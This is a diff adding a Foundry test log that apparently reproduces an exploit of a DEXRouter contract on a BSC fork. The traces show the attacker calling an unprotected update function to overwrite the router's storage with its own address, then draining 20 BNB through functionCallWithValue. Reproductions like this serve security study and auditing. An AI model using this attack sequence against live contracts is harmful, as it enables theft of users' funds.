@@ -1,0 +1,41 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DEXRouter_exp.sol:ContractTest
+[PASS] testExploit() (gas: 45274)
+Logs:
+  Attacker BNB balance before exploit: 0.000000000000000000
+  Attacker BNB balance after exploit: 20.000000000000000000
+
+Traces:
+  [4365] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 32161325 [3.216e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(DEXRouter: [0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7], "DEXRouter")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [45274] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance before exploit", val: 0, decimals: 18)
+    ├─ [21671] DEXRouter::update(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [688] ContractTest::fallback(0xe44a73b70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─  storage changes:
+    │   │   @ 4: 0x000000000000000000000000a2ed9fbd90c518dd1a89ecb2edc497f1de5f6be3 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 3: 0x0000000000000000000000000000000000004946c0e9f43f4dee607b0ef1fa1c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 2: 0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 1: 0x000000000000000000000000a025f4e855ac654d8e80a31ce09c7d7df502ea1d → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [9648] DEXRouter::functionCallWithValue(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0dbe671f, 20000000000000000000 [2e19])
+    │   ├─ [360] ContractTest::a{value: 20000000000000000000}()
+    │   │   └─ ← [Return] true
+    │   ├─ [688] ContractTest::fallback(0xe44a73b70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance after exploit", val: 20000000000000000000 [2e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.46s (1.28s CPU time)
+
+Ran 1 test suite in 4.06s (2.46s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
